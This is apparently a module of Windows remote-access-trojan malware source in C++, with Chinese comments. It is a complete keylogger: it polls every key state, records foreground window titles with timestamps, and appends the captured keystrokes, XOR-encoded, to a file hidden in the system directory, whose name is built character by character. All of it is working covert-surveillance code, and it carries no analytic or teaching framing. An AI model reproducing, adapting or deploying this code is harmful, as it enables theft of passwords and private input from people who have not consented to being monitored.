void SaveToFile(CHAR *lpBuffer)
{
	char keylog[] = {'\\','o','u','r','l','o','g','.','d','a','t','\0'};
	CHAR	strRecordFile[MAX_PATH];
	GetSystemDirectory(strRecordFile, sizeof(strRecordFile));
	lstrcat(strRecordFile, keylog);
	HANDLE	hFile = CreateFile(strRecordFile, GENERIC_WRITE, FILE_SHARE_WRITE,
		NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD dwBytesWrite = 0;
	DWORD dwSize = GetFileSize(hFile, NULL);
	if (dwSize < 1024 * 1024 * 50)
		SetFilePointer(hFile, 0, 0, FILE_END);
	// 加密
	int	nLength = lstrlen(lpBuffer);
	LPBYTE	lpEncodeBuffer = new BYTE[nLength];
	for (int i = 0; i < nLength; i++)
		lpEncodeBuffer[i] = lpBuffer[i] ^ 98;
	WriteFile(hFile, lpEncodeBuffer, lstrlen(lpBuffer), &dwBytesWrite, NULL);
	CloseHandle(hFile);	
	
	return ;
}
char *LowerCase[]=
{
	"Backspace",
		"Tab",
		"Clear", 
		"Enter",
		"Shift",
		"Ctrl",
		"Alt",
		"Pause", 
		"[CapsLock]", 
		"Esc",
		" ", 
		"PageUp", 
		"PageDown", 
		"End",
		"Home", 
		"LeftArrow", 
		"UpArrow",
		"RightArrow", 
		"DownArrow", 
		"Select",
		"Print",
		"Execute",
		"Snapshot",
		"Insert",
		"Delete",
		"Help", 
		"0", 
		"1", 
		"2",
		"3", 
		"4", 
		"5", 
		"6", 
		"7", 
		"8", 
		"9", 
		"a", 
		"b", 
		"c", 
		"d", 
		"e", 
		"f", 
		"g", 
		"h", 
		"i", 
		"j", 
		"k", 
		"l", 
		"m", 
		"n", 
		"o", 
		"p", 
		"q", 
		"r", 
		"s", 
		"t", 
		"u", 
		"v", 
		"w", 
		"x", 
		"y", 
		"z", 
		"0",
		"1", 
		"2", 
		"3", 
		"4",
		"5",
		"6", 
		"7", 
		"8",
		"9", 
		"*", 
		"+", 
		"Enter", 
		"-",
		".", 
		"/", 
		"F1", 
		"F2", 
		"F3", 
		"F4", 
		"F5", 
		"F6", 
		"F7", 
		"F8", 
		"F9", 
		"F10", 
		"F11",
		"F12", 
		"Num Lock", 
        "Scroll",
		"."
};

char *UpperCase[]=
{
	
	"Backspace",
		"Tab",
		"Clear", 
		"Enter",
		"Shift",
		"Ctrl",
		"Alt",
		"Pause", 
		"[CapsLock]", 
		"Esc",
		" ", 
		"PageUp", 
		"PageDown", 
		"End",
		"Home", 
		"LeftArrow", 
		"UpArrow",
		"RightArrow", 
		"DownArrow", 
		"Select",
		"Print",
		"Execute",
		"Snapshot",
		"Insert",
		"Delete",
		"Help", 
		"0", 
		"1", 
		"2",
		"3", 
		"4", 
		"5", 
		"6", 
		"7", 
		"8", 
		"9", 
		"A", 
		"B", 
		"C", 
		"D", 
		"E", 
		"F", 
		"G", 
		"H", 
		"I", 
		"J", 
		"K", 
		"L", 
		"M", 
		"N", 
		"O", 
		"P", 
		"Q", 
		"R", 
		"S", 
		"T", 
		"U", 
		"V", 
		"W", 
		"X", 
		"Y", 
		"Z", 
		"0",
		"1", 
		"2", 
		"3", 
		"4",
		"5",
		"6", 
		"7", 
		"8",
		"9", 
		"*", 
		"+", 
		"Enter", 
		"-",
		".", 
		"/", 
		"F1", 
		"F2", 
		"F3", 
		"F4", 
		"F5", 
		"F6", 
		"F7", 
		"F8", 
		"F9", 
		"F10", 
		"F11",
		"F12", 
		"Num Lock", 
        "Scroll",
		"."
};

int SpecialKeys[]=
{
	8,//Backspace!
		9,//Tab!
		12,//Clear! 
		13,//Enter!
		16,//Shift!
		17,//Ctrl!
		18,//Alt!
		19,//Pause! 
		20,//Caps Lock! 
		27,//Esc!
		32,//Space! 
		33,//Page Up! 
		34,//Page Down! 
		35,//End!
		36,//Home! 
		37,//Left Arrow! 
		38,//Up Arrow!
		39,//Right Arrow! 
		40,//Down Arrow! 
		41,//Select!
		42,//Print!
		43,//Execute!
		44,//Snapshot!
		45,//Insert!
		46,//Delete!
		47,//Help! 
		48,//0! 
		49,//1! 
		50,//2!
		51,//3! 
		52,//4! 
		53,//5! 
		54,//6! 
		55,//7! 
		56,//8! 
		57,//9! 
		65,//A! 
		66,//B! 
		67,//C! 
		68,//D! 
		69,//E! 
		70,//F! 
		71,//G! 
		72,//H! 
		73,//I! 
		74,//J! 
		75,//K! 
		76,//L! 
		77,//M! 
		78,//N! 
		79,//O! 
		80,//P! 
		81,//Q! 
		82,//R! 
		83,//S! 
		84,//T! 
		85,//U! 
		86,//V! 
		87,//W! 
		88,//X! 
		89,//Y! 
		90,//Z! 
		96,//0!
		97,//1! 
		98,//2! 
		99,//3! 
		100,//4!
		101,//5!
		102,//6! 
		103,//7! 
		104,//8!
		105,//9! 
		106,//*! 
		107,//+! 
		108,//Enter! 
		109,//-!
		110,//.! 
		111,///! 
		112,//F1! 
		113,//F2! 
		114,//F3! 
		115,//F4! 
		116,//F5! 
		117,//F6! 
		118,//F7! 
		119,//F8! 
		120,//F9! 
		121,//F10! 
		122,//F11!
		123,//F12! 
		144,//Num Lock! 
		145,//Scroll! 
		190,
};

HWND PreviousFocus=NULL;
CHAR WindowCaption[1024]={0};
HWND hFocus = NULL;
BOOL IsWindowsFocusChange()
{
				
				//	memset(hFocus,0,sizeof(hFocus));
				memset(WindowCaption,0,sizeof(WindowCaption));
				hFocus = GetForegroundWindow(); 
				GetWindowText(hFocus,WindowCaption,sizeof(WindowCaption));
				
				
				BOOL ReturnFlag = FALSE; 
				CHAR temp[1024]={0};
				if (hFocus == PreviousFocus) 
				{	 
					
				}
				else
				{
					if (lstrlen(WindowCaption) > 0)
					{
						SYSTEMTIME   s;  
						GetLocalTime(&s);  
						wsprintf(temp,"\r\n[标题:] %s\r\n[时间:]%d-%d-%d  %d:%d:%d\r\n",WindowCaption,s.wYear,s.wMonth,s.wDay,s.wHour,s.wMinute,s.wSecond);
						SaveToFile(temp);
						memset(temp,0,sizeof(temp));
						memset(WindowCaption,0,sizeof(WindowCaption)); 
						ReturnFlag=TRUE; 
					}
					PreviousFocus = hFocus;
				}
				return ReturnFlag; 
}

DWORD WINAPI KeyLogger(LPARAM lparam)
{
	int bKstate[256] = {0}; 
	int i,x;
	CHAR KeyBuffer[600]; 
	int state; 
	int shift; 
	memset(KeyBuffer,0,sizeof(KeyBuffer));
	while(TRUE)
	{
		Sleep(8); 
		if (lstrlen(KeyBuffer) != 0) 
		{
			if (IsWindowsFocusChange())
			{
				lstrcat(KeyBuffer,"\n");
				SaveToFile("[内容:]");
				SaveToFile(KeyBuffer);
				memset(KeyBuffer,0,sizeof(KeyBuffer));
			}
			else
			{
				lstrcat(KeyBuffer,"\n");
				SaveToFile(KeyBuffer);
				memset(KeyBuffer,0,sizeof(KeyBuffer));
			}
		}
		for(i=0;i<93;i++) 
		{
			shift = GetKeyState(VK_SHIFT); 
			x = SpecialKeys[ i ]; 
			if (GetAsyncKeyState(x) & 0x8000) 
			{
				if (((GetKeyState(VK_CAPITAL) != 0) && (shift > -1) && (x > 64) && (x < 91))) //Caps Lock And Shift Is Not Pressed
				{
					bKstate[x] = 1; 
				}
				else
					if (((GetKeyState(VK_CAPITAL) != 0) && (shift < 0) && (x > 64) && (x < 91))) //Caps Lock And Shift Is Pressed
					{
						bKstate[x] = 2; 
					}
					else
						if (shift < 0) 
						{
							bKstate[x] = 3; 
						}
						else
							bKstate[x] = 4; 
			}
			else
			{
				if (bKstate[x] != 0) 
				{
					state = bKstate[x]; 
					bKstate[x] = 0;
					if (x == 8) 
					{
						KeyBuffer[lstrlen(KeyBuffer) - 1] = 0;
						continue;
					}
					if (x==106)
					{
						lstrcat(KeyBuffer,"*\r\n");
						SaveToFile(KeyBuffer);
						memset(KeyBuffer,0,sizeof(KeyBuffer)); 
						continue; 
					}
					else
						if (lstrlen(KeyBuffer) > 550) 
						{
							SaveToFile(KeyBuffer);
							memset(KeyBuffer,0,sizeof(KeyBuffer)); 
							continue;
						}
						else
							if (x == 13) 
							{
								lstrcat(KeyBuffer,"<Enter>\r\n");
								SaveToFile(KeyBuffer);
								memset(KeyBuffer,0,sizeof(KeyBuffer)); 
								continue; 
							}
							else
							{
								if ((state%2) == 1) 
								{
									lstrcat(KeyBuffer,(CHAR *)UpperCase[ i ]);
									
								}
								else
									if ((state%2) == 0) 
									{
										lstrcat(KeyBuffer,(CHAR *)LowerCase[ i ]); 
									}
							}
				}
			}
		}
	}
	return 0; 
}
